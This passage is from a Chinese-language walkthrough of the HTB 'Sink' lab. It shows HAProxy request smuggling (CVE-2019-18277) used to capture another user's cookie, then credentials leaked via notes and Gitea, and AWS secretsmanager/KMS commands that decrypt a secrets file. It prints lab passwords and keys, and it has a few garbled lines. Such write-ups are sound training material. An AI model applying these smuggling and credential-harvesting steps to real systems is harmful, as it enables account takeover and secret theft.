    Content-Type: application/x-www-form-urlencoded
    Content-Length: 8
    Connection: keep-alive
    msg=
后面这部分POST请求即为我们走私的请求，因为需要在`Transfer-Encoding`的`chunked`前面加`\x0b`，我们先添加`Cwo=`，然后在`burp`中`shift+ctrl+b` `(base64
decode)`即可，或者直接在`burp`中添加`[\x0b]`也可以。发送后我们在评论处可以看到一条新的评论，包含了这个用户的cookie。
`Cookie editor`替换一下，即可以获得`[PI:EMAIL](mailto:PI:EMAIL)`的权限。
###  Credentials
在`Notes`中可以获得三部分`Credentials`:
    Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz
    Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3
    Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8Z3})zzfQ3`这个密码可以成功登录3000端口的`Gitea`：
`Gitea`是一个类似`git`的代码托管平台，在几个主要的`Repositories`里看了下，发现`key management`中似乎有一些秘钥信息
发现是用户`marcus`提交的`ssh`私钥
###  User -marcus
将私钥拷到本地，并修改权限为600，`ssh`尝试连接`marcus`用户成功
`ls`当前目录发现`user.txt`，获得第一个`flag`
## 0x04 Privilege Escalation
根据`Key Management`可以发现，存在一些`AWS`的操作；同样在`Log
Management`中，发现了`marcus`删除`AWS`相关配置的`key`和`secret`的提交记录
顺着可以找到之前提交的配置的相关代码
     'eu',
        'endpoint' => 'http://127.0.0.1:4566',
        'credentials' => [
            'key' => 'AKIAIUEN3QWCPSTEITJQ',
            'secret' => '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'
        ],
        'version' => 'latest'
    ]);
    try {
    $client->createLogGroup(array(
        'logGroupName' => 'Chef_Events',
    ));
    }
    catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }
    try {
    $client->createLogStream([
        'logGroupName' => 'Chef_Events',
        'logStreamName' => '20201120'
    ]);
    }catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }
    ?>
###  AWS CLI Configure
`Google`了一下`AWS、key、secret`，发现在官方指导手册中有相关介绍，可以通过`AWS`配置`key`和`secret`，从而访问关键隐私信息。官方指导手册如下：
> 
>
>  quickstart.html>
我们也尝试按照官方说明配置下，只需要修改`key`和`secret`即可，`region`代表所在区域，直接按照官方默认来设置：
    marcus@sink:~$ aws configure
    AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
    AWS Secret Access Key [None]: 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
    Default region name [None]: us-west-2
    Default output format [None]: json
###  AWS Secretsmanager
配置完成之后可以通过`secretsmanager`列举保存的`secrets`
    aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
然后根据列举出的`secrets`逐个查询
    aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:xxxxxxx"
获得了以下内容
    username:PI:EMAIL   password:EALB=bcC=`a7f2#k
    username:PI:EMAIL  password:Welcome123!
    username:PI:EMAIL    password:R);\\)ShS99mZ~8j
###  User-david
查看`/etc/passwd`和`/home`路径，发现是存在`david`用户的，尝试了下可以成功用密码切换到`david`用户
## 0x05 AWS Key Management
###  severs.enc
`david`用户目录下`/home/david/Projects/Prod_Deployment`发现了一个`servers.enc`文件，显然需要解密
因为目录是`Gitea`项目相关的目录，猜测很可能还是需要通过AWS来解密，搜索之后发现了`AWS Key Management`
> 
>
>  encryption.html>
###  list-keys
同样使用`david`用户先按照之前的`AWS`进行配置，配置之后可以`list-keys`
    aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
###  decrypt
按照国外大神的思路进行解密操作，`bash`脚本如下：
    #!/binbash
    for KEY in $(aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | awk -F\" '{ print $4 }')
    do 
        aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "${KEY}"
        aws --endpoint-url="http://127.0.0.1:4566/" kms decrypt --key-id "${KEY}" --ciphertext-blob "fileb:///home/david/Projects/Prod_Deployment/servers.enc" --encryption-algorithm "RSAES_OAEP_SHA_256" --output "text" --query "Plaintext"
    done
得到了一串base64的字符串，推荐使用`CyberChef`进行解密，选取自己想要的模块直接拖就行，非常方便：
> 
`base64`之后需要再`gunzip`解下包，可以得到最后的秘钥：
    name: admin
    pass: _uezduQ!EY5AHfe2
done!
###  总结
总的来看，这个靶机主要涉及到了`HTTP`请求走私、`HAProxy HTTP request smuggling
(CVE-2019-18277)`、`Gitea`信息泄露、`AWS CLI`配置、`AWS Key
Management`等知识点，以前没搞过AWS的可以通过这个靶机好好熟悉下。另外HTTP请求走私虽然利用比较苛刻，但是也算是一个可以利用的攻击方法，需要后续在深入学习下。
## 0x06 Reference
  * 1、
  * 2、
  * 3、
  * 4、